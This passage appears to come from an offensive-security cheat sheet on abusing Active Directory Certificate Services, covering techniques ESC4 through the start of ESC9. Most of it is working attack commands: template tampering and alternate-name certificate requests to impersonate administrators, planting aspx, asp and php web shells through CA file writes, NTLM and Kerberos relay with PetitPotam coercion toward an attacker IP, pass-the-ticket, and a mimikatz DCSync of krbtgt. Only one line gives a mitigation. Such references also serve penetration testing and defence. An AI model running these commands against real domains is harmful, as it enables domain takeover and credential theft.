<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">certipy</span> <span class="n">template</span> <span class="s1">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">fc525c9683e8fe067095ba2ddc971889</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-save-old</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c"># request a certificate based on the ESC4 template, just like ESC1.</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-alt</span> <span class="s1">&#39;administrator@corp.local&#39;</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c"># restore the old configuration</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="n">certipy</span> <span class="n">template</span> <span class="s1">&#39;corp.local/johnpc$@ca.corp.local&#39;</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">fc525c9683e8fe067095ba2ddc971889</span> <span class="n">-template</span> <span class="s1">&#39;ESC4&#39;</span> <span class="n">-configuration</span> <span class="n">ESC4</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<h2 id="esc5-vulnerable-pki-object-access-control">ESC5 - Vulnerable PKI Object Access Control</h2>
<blockquote>
<p>Escalate the privileges from <strong>Domain Administrator</strong> in the child domain into <strong>Enterprise Administrator</strong> at the forest root.</p>
</blockquote>
<p><strong>Requirements</strong>:</p>
<ul>
<li>Add new templates to the "Certificate" Templates container</li>
<li>"WRITE" access to the <code>pKIEnrollmentService</code> object</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Use <code>PsExec</code> to launch <code>mmc</code> as SYSTEM on the child DC: <code>psexec.exe /accepteula -i -s mmc</code></li>
<li>Connect to "Configuration naming context" &gt; "Certificate Template" container</li>
<li>Open <code>certsrv.msc</code> as SYSTEM and duplicate an existing template</li>
<li>Edit the properties of the template to:<ul>
<li>Granting enroll rights to a principal we control in the child domain.</li>
<li>Including Client Authentication in the Application Policies.</li>
<li>Allowing SANs in certificate requests.</li>
<li>Not enabling manager approval or authorized signatures.</li>
</ul>
</li>
<li>Publish the certificate template to the CA<ul>
<li>Publish by adding the template to the list in <code>certificateTemplate</code> property of <code>CN=Services</code>&gt;<code>CN=Public Key Services</code>&gt;<code>CN=Enrollment Services</code>&gt;<code>pkiEnrollmentService</code></li>
</ul>
</li>
<li>Finally use the ESC1 vulnerability introduced in the duplicated template to issue a certificate impersonating an Enterprise Administrator.</li>
</ul>
<h2 id="esc6-editf_attributesubjectaltname2">ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
<blockquote>
<p>If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.</p>
</blockquote>
<p><strong>Exploitation</strong></p>
<ul>
<li>
<p>Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to check for <strong>UserSpecifiedSAN</strong> flag state which refers to the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">cas</span>
</code></pre></div>
</li>
<li>
<p>Request a certificate for a template and add an altname, even though the default <code>User</code> template doesn't normally allow to specify alternative names</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">domain-DC-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">DomAdmin</span>
</code></pre></div>
</li>
</ul>
<p><strong>Mitigation</strong></p>
<ul>
<li>Remove the flag: <code>certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2</code></li>
</ul>
<h2 id="esc7-vulnerable-certificate-authority-access-control">ESC7 - Vulnerable Certificate Authority Access Control</h2>
<p><strong>Exploitation</strong></p>
<ul>
<li>
<p>Detect CAs that allow low privileged users the <code>ManageCA</code>  or <code>Manage Certificates</code> permissions</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
</code></pre></div>
</li>
<li>
<p>Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">setconfig</span> <span class="p">/</span><span class="n">enablesan</span> <span class="p">/</span><span class="n">restart</span>
</code></pre></div>
</li>
<li>
<p>Request the certificate with the desired SAN.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">User</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">super</span><span class="p">.</span><span class="n">adm</span>
</code></pre></div>
</li>
<li>
<p>Grant approval if required or disable the approval requirement</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># Grant</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">issue</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="no">[REQUEST ID]</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c"># Disable</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">setconfig</span> <span class="p">/</span><span class="n">removeapproval</span> <span class="p">/</span><span class="n">restart</span>
</code></pre></div>
</li>
</ul>
<p>Alternative exploitation from <strong>ManageCA</strong> to <strong>RCE</strong> on ADCS server:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># Get the current CDP list. Useful to find remote writable shares:</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">readonly</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c"># Write an aspx shell to a local web directory:</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SystemData</span><span class="p">\</span><span class="n">CES</span><span class="p">\</span><span class="n">CA-Name</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Local</span><span class="p">\</span><span class="n">Path</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">aspx</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c"># Write the default asp shell to a local web directory:</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">asp</span>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c"># Write a php shell to a remote web directory:</span>
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">writefile</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">SERVER</span><span class="p">\</span><span class="n">ca-name</span> <span class="p">/</span><span class="n">path</span><span class="p">:\\</span><span class="n">remote</span><span class="p">.</span><span class="n">server</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Local</span><span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span>
</code></pre></div>
<h2 id="esc8-web-enrollment-relay">ESC8 - Web Enrollment Relay</h2>
<blockquote>
<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p>
</blockquote>
<p>Require <a href="https://github.com/SecureAuthCorp/impacket/pull/1101">SecureAuthCorp/impacket</a> PR #1101</p>
<ul>
<li><strong>Version 1</strong>: NTLM Relay + Rubeus + PetitPotam</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">ca-server</span><span class="p">&gt;/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="p">./</span><span class="n">examples</span><span class="p">/</span><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">VulnTemplate</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c"># For a member server or workstation, the template would be &quot;Computer&quot;.</span>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c"># Other templates: workstation, DomainController, Machine, KerberosAuthentication</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c"># Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam </span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c"># You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">topotam</span><span class="p">/</span><span class="n">PetitPotam</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">python3</span> <span class="n">petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="nv">$DOMAIN</span> <span class="n">-u</span> <span class="nv">$USER</span> <span class="n">-p</span> <span class="nv">$PASSWORD</span> <span class="nv">$ATTACKER_IP</span> <span class="nv">$TARGET_IP</span>
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="n">python3</span> <span class="n">petitpotam</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="s1">&#39;&#39;</span> <span class="n">-u</span> <span class="s1">&#39;&#39;</span> <span class="n">-p</span> <span class="s1">&#39;&#39;</span> <span class="nv">$ATTACKER_IP</span> <span class="nv">$TARGET_IP</span>
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="n">python3</span> <span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">listener</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">target</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span>
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="n">python3</span> <span class="n">dementor</span><span class="p">.</span><span class="n">py</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">250</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="n">user1</span> <span class="n">-p</span> <span class="n">Password1</span> <span class="n">-d</span> <span class="n">lab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="c"># Use the certificate with rubeus to request a TGT</span>
<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:&lt;</span><span class="n">base64-certificate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">dc1</span><span class="p">$</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">MIIRdQIBAzC</span><span class="p">...</span><span class="n">mUUXS</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>
<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a><span class="c"># Now you can use the TGT to perform a DCSync</span>
<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span>
</code></pre></div>
<ul>
<li><strong>Version 2</strong>: NTLM Relay + Mimikatz + Kekeo</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">impacket</span><span class="p">&gt;</span> <span class="n">python3</span> <span class="p">./</span><span class="n">examples</span><span class="p">/</span><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">DomainController</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="c"># Mimikatz</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">misc</span><span class="p">::</span><span class="n">efs</span> <span class="p">/</span><span class="n">server</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">connect</span><span class="p">:&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">noauth</span>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="c"># Kekeo</span>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="n">kekeo</span><span class="p">&gt;</span> <span class="n">base64</span> <span class="p">/</span><span class="n">input</span><span class="p">:</span><span class="n">on</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">kekeo</span><span class="p">&gt;</span> <span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">pfx</span><span class="p">:&lt;</span><span class="n">BASE64-CERT-FROM-NTLMRELAY</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">dc</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="c"># Mimikatz</span>
<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="n">mimikatz</span><span class="p">&gt;</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span>
</code></pre></div>
<ul>
<li><strong>Version 3</strong>: Kerberos Relay</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c"># Setup the relay</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">sudo</span> <span class="n">krbrelayx</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-target</span> <span class="n">http</span><span class="p">://</span><span class="n">CA</span><span class="p">/</span><span class="n">certsrv</span> <span class="n">-ip</span> <span class="n">attacker_IP</span> <span class="p">-</span><span class="n">-victim</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">Machine</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c"># Run mitm6</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">sudo</span> <span class="n">mitm6</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-host-allowlist</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-relay</span> <span class="n">CA</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-v</span>
</code></pre></div>
<ul>
<li><strong>Version 4</strong>: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">bats3c</span><span class="p">/</span><span class="n">ADCSPwn</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">&lt;</span><span class="n">cs</span> <span class="n">server</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-port</span> <span class="no">[local port]</span> <span class="p">-</span><span class="n">-remote</span> <span class="no">[computer]</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-port</span> <span class="n">9001</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-output</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">cert_b64</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">adcspwn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="n">cs</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-remote</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-username</span> <span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">mranderson</span> <span class="p">-</span><span class="n">-password</span> <span class="n">The0nly0ne</span><span class="p">!</span> <span class="p">-</span><span class="n">-dc</span> <span class="n">dc</span><span class="p">.</span><span class="n">pwnlab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="c"># ADCSPwn arguments</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">adcs</span>            <span class="p">-</span>       <span class="n">This</span> <span class="n">is</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">AD</span> <span class="n">CS</span> <span class="n">server</span> <span class="n">which</span> <span class="n">authentication</span> <span class="n">will</span> <span class="n">be</span> <span class="n">relayed</span> <span class="n">to</span><span class="p">.</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="n">secure</span>          <span class="p">-</span>       <span class="n">Use</span> <span class="n">HTTPS</span> <span class="n">with</span> <span class="n">the</span> <span class="n">certificate</span> <span class="n">service</span><span class="p">.</span>
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="n">port</span>            <span class="p">-</span>       <span class="n">The</span> <span class="n">port</span> <span class="n">ADCSPwn</span> <span class="n">will</span> <span class="n">listen</span> <span class="n">on</span><span class="p">.</span>
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="n">remote</span>          <span class="p">-</span>       <span class="n">Remote</span> <span class="n">machine</span> <span class="n">to</span> <span class="n">trigger</span> <span class="n">authentication</span> <span class="n">from</span><span class="p">.</span>
<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="n">username</span>        <span class="p">-</span>       <span class="n">Username</span> <span class="k">for</span> <span class="n">non-domain</span> <span class="n">context</span><span class="p">.</span>
<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="n">password</span>        <span class="p">-</span>       <span class="n">Password</span> <span class="k">for</span> <span class="n">non-domain</span> <span class="n">context</span><span class="p">.</span>
<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="n">dc</span>              <span class="p">-</span>       <span class="n">Domain</span> <span class="n">controller</span> <span class="n">to</span> <span class="n">query</span> <span class="k">for</span> <span class="n">Certificate</span> <span class="n">Templates</span> <span class="p">(</span><span class="n">LDAP</span><span class="p">).</span>
<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="n">unc</span>             <span class="p">-</span>       <span class="nb">Set </span><span class="n">custom</span> <span class="n">UNC</span> <span class="n">callback</span> <span class="n">path</span> <span class="k">for</span> <span class="n">EfsRpcOpenFileRaw</span> <span class="p">(</span><span class="n">Petitpotam</span><span class="p">)</span> <span class="p">.</span>
<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="n">output</span>          <span class="p">-</span>       <span class="n">Output</span> <span class="n">path</span> <span class="n">to</span> <span class="n">store</span> <span class="n">base64</span> <span class="n">generated</span> <span class="n">crt</span><span class="p">.</span>
</code></pre></div>
<ul>
<li><strong>Version 5</strong>: Certipy ESC8</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">certipy</span> <span class="n">relay</span> <span class="n">-ca</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">19</span><span class="p">.</span><span class="n">100</span>
</code></pre></div>
<h2 id="esc9-no-security-extension">ESC9 - No Security Extension</h2>
<p><strong>Requirements</strong></p>
<ul>
<li><code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code></li>
<li>Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li>
<li>Certificate specifies <code>Any Client</code> authentication EKU</li>
<li><code>GenericWrite</code> over any account A to compromise any account B</li>
</ul>
<p><strong>Scenario</strong></p>
<p><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#74;&#111;&#104;&#110;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#74;&#111;&#104;&#110;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a> has <strong>GenericWrite</strong> over <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a>, and we want to compromise <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#65;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#65;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a>.
